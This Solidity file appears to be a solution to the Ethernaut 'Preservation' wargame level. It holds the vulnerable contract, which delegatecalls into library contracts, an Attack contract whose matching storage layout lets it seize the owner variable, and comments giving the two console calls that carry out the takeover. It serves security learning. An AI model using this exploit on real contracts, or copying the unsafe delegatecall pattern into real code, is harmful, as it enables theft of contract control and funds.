// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

// Deploy this attack contact because we knew that to make delegatecall the contract should have the same data layout so we have created dummy varibales.
//as we know the Preservation is calling delegaecall to setTime function , so our setTime() sets owner = address(uint160(_time)) and hacks owner variable.
// after deploying the EOA, we go to the console and execute `contract.setTimeFirst('ATTACK_EOA_address')` and again  `contract.setTimeFirst(player)`
// at first call the EOA will be placed and at second call owner will be overide
/*
1. Preservation delegates to original library → runs its setTime(uint256)
2. That function sets storedTime = _time; → writes to slot 0
3. But in Preservation, slot 0 = timeZone1Library
4. So now your attack contract address is saved as the new timeZone1Library
*/ 
contract Attack {
    address public dummy1; // slot 0
    address public dummy2; // slot 1
    address public owner;  // slot 2

    function setTime(uint256 _input) public {
        owner = address(uint160(_input));
    }
}
